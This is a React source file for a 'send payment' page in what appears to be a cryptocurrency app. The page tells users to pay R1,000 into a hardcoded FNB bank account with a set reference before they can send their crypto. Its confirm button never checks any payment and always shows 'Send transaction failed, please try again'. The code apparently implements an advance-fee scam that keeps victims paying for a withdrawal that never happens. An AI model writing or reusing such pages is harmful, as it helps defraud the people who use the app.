// client/src/pages/SendPaymentPage.js
import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import '../styles/SendPaymentPage.css';

const SendPaymentPage = () => {
  const navigate = useNavigate();
  const [error, setError] = useState('');
  const paymentAmount = "1,000"; // Default amount for send payment in Rand
  const bankDetails = {
    bankName: "FNB BANK",
    beneficiaryName: "Mama pty",
    reference: "0672626266",
    accountNumber: "62509963139",
    paymentType: "Immediate Payment (Just Once)"
  };

  const handleConfirmPayment = () => {
    // Simulate a send payment failure
    setError('Send transaction failed, please try again.');
  };

  return (
    <div className="payment-container">
      {/* Section 1: Payment Summary */}
      <div className="payment-section summary-section">
        <h3>Payment Summary</h3>
        <p><strong>Payment Amount:</strong> R {paymentAmount}</p>
        <p>You will have to pay R {paymentAmount} to the bank details below before you can send the crypto.</p>
      </div>
      {/* Section 2: Banking Details */}
      <div className="payment-section bank-details">
        <h3>Banking Details</h3>
        <p><strong>Bank:</strong> {bankDetails.bankName}</p>
        <p><strong>Beneficiary Name:</strong> {bankDetails.beneficiaryName}</p>
        <p><strong>Beneficiary Reference:</strong> {bankDetails.reference}</p>
        <p><strong>Account Number:</strong> {bankDetails.accountNumber}</p>
        <p><strong>Payment Type:</strong> {bankDetails.paymentType}</p>
        <p><strong>Note:</strong> Don't forget to add “{bankDetails.reference}” as reference.</p>
      </div>
      {/* Section 3: Confirmation Checkbox */}
      <div className="payment-section confirmation-section">
        <input type="checkbox" id="confirmPayment" />
        <label htmlFor="confirmPayment">I confirm that I have sent the required payment.</label>
      </div>
      {/* Section 4: Confirm Payment Button */}
      <div className="payment-section button-section">
        <button onClick={handleConfirmPayment}>Confirm Payment</button>
      </div>
      {/* Section 5: Message Display */}
      <div className="payment-section message-section">
        {error && <p className="error-msg">{error}</p>}
      </div>
      <button className="back-button" onClick={() => navigate('/dashboard')}>Back to Dashboard</button>
    </div>
  );
};

export default SendPaymentPage;
